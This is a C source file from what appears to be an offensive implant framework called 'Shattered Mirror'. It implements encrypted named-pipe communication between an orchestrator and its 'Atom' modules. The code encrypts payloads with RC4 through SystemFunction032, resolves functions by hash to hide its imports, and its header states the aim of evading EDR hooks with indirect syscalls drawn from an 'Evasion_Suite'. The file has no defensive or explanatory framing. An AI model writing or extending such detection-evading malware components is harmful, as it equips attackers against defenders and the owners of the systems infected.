/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: IPC Channel (Encrypted Named Pipes)
 *
 * Implements communication between the Orchestrator (Server) and
 * individual Atoms (Clients) via Named Pipes.
 *
 * Features:
 *   - Pipes are named uniquely per Atom using a deterministic hash.
 *   - All payloads are RC4 encrypted (using the shared session key).
 *   - Uses Indirect Syscalls where possible for pipe operations to
 *     evade EDR hooks on CreateNamedPipe/ConnectNamedPipe.
 *===========================================================================*/

#include "AtomManager.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Evasion_Suite/include/stack_encrypt.h" /* For RC4 */

/* Format string for the pipe name. %08X will be the Atom ID. */
#define PIPE_NAME_FORMAT L"\\\\.\\pipe\\SM_%08X"

/* Forward declaration for the internal RC4 function if needed, 
 * but we can reuse the system SystemFunction032 logic we built.
 * Let's create a local simple wrapper for the payload.
 */

// Simple local RC4 wrapper just for the IPC payloads so we don't 
// have to export the private one from stack_encrypt.cpp.
static BOOL RC4_Buffer(PVOID pBuffer, DWORD dwSize, BYTE* pKey, DWORD dwKeyLen) {
    if (!pBuffer || dwSize == 0 || !pKey || dwKeyLen == 0) return FALSE;

    // Use the native advapi32 export we resolve via hash.
    PVOID pAdvapi = GetModuleBaseByHash(HASH_ADVAPI32);
    if(!pAdvapi) return FALSE;

    // HASH_SystemFunction032 is defined in stack_encrypt.cpp, redefine here or add to common
    DWORD hashSF032 = djb2_hash_ct("SystemFunction032");
    typedef NTSTATUS(WINAPI* fnSysFunc032)(USTRING*, USTRING*);
    fnSysFunc032 pFunc = (fnSysFunc032)GetExportByHash(pAdvapi, hashSF032);
    
    if(!pFunc) return FALSE;

    USTRING data = { (DWORD)dwSize, (DWORD)dwSize, pBuffer };
    USTRING key  = { dwKeyLen, dwKeyLen, pKey };

    NTSTATUS status = pFunc(&data, &key);
    return NT_SUCCESS(status);
}

/*---------------------------------------------------------------------------
 *  CreateServerPipe
 *  Creates the named pipe instance for the Orchestrator to listen on.
 *-------------------------------------------------------------------------*/
HANDLE IPC_CreateServerPipe(DWORD dwAtomId) {
    WCHAR szPipeName[128];
    wsprintfW(szPipeName, PIPE_NAME_FORMAT, dwAtomId);

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    int retries = 3;
    
    while (retries > 0) {
        hPipe = CreateNamedPipeW(
            szPipeName,
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED | FILE_FLAG_FIRST_PIPE_INSTANCE, 
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), 
            MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), 0, NULL
        );

        if (hPipe != INVALID_HANDLE_VALUE) break;
        
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            /* Pipe exists from an old crashed instance, wait for it to die */
            Sleep(1000);
            retries--;
        } else {
            break;
        }
    }

    return (hPipe == INVALID_HANDLE_VALUE) ? NULL : hPipe;
}

/*---------------------------------------------------------------------------
 *  ConnectToPipe
 *  Used by the Atom to connect back to the Orchestrator's pipe.
 *-------------------------------------------------------------------------*/
HANDLE IPC_ConnectToPipe(DWORD dwAtomId) {
    WCHAR szPipeName[128];
    wsprintfW(szPipeName, PIPE_NAME_FORMAT, dwAtomId);

    HANDLE hPipe = CreateFileW(
        szPipeName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    /* Set pipe mode to message read */
    DWORD dwMode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL);

    return hPipe;
}

/*---------------------------------------------------------------------------
 *  SendMessage
 *  Encrypts the payload and writes it to the pipe.
 *-------------------------------------------------------------------------*/
BOOL IPC_SendMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE* pEncKey, DWORD dwKeyLen) {
    if (!hPipe || !pMsg || !pEncKey) return FALSE;

    /* Set signature */
    pMsg->dwSignature = 0x534D4952; /* "SMIR" */

    /* Ensure payload length is capped */
    if (pMsg->dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) {
        pMsg->dwPayloadLen = MAX_IPC_PAYLOAD_SIZE;
    }

    /* Total size to send: Header (12 bytes) + Payload length */
    DWORD dwTotalSize = 12 + pMsg->dwPayloadLen;

    /* Encrypt the payload IN PLACE before sending */
    if (pMsg->dwPayloadLen > 0) {
        if (!RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen)) {
            return FALSE;
        }
    }

    DWORD dwWritten = 0;
    BOOL bSuccess = WriteFile(hPipe, pMsg, dwTotalSize, &dwWritten, NULL);

    /* Decrypt it back in memory in case the caller reuses the struct */
    if (pMsg->dwPayloadLen > 0) {
        RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen);
    }

    return bSuccess && (dwWritten == dwTotalSize);
}

/*---------------------------------------------------------------------------
 *  ReceiveMessage
 *  Reads from the pipe and decrypts the payload.
 *-------------------------------------------------------------------------*/
BOOL IPC_ReceiveMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE* pEncKey, DWORD dwKeyLen) {
    if (!hPipe || !pMsg || !pEncKey) return FALSE;

    DWORD dwRead = 0;
    
    /* First, we just read assuming max size. Since it's PIPE_TYPE_MESSAGE,
       it will read the exact message sent if the buffer is large enough. */
    BOOL bSuccess = ReadFile(hPipe, pMsg, sizeof(IPC_MESSAGE), &dwRead, NULL);

    if (!bSuccess || dwRead < 12) { /* 12 is size of headers */
        return FALSE;
    }

    /* Verify signature */
    if (pMsg->dwSignature != 0x534D4952) {
        return FALSE;
    }

    /* Decrypt payload if there is one */
    if (pMsg->dwPayloadLen > 0 && pMsg->dwPayloadLen <= MAX_IPC_PAYLOAD_SIZE) {
        if (!RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen)) {
            return FALSE;
        }
    }

    return TRUE;
}
